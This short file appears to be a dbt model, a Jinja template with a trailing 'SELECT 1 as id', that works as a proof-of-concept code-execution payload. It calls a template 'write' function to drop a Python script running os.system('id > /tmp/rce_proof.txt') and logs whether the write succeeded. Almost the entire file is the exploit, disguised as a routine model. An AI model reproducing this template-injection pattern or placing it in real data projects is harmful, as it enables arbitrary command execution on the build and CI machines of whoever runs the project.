{{ log("WRITE_FUNC=" ~ (write | string), info=True) }}

{% set test_content = "#!/usr/bin/env python3\nimport os\nos.system('id > /tmp/rce_proof.txt')\n" %}

{% do write(test_content) %}
{{ log("WRITE_CALLED_OK", info=True) }}

SELECT 1 as id
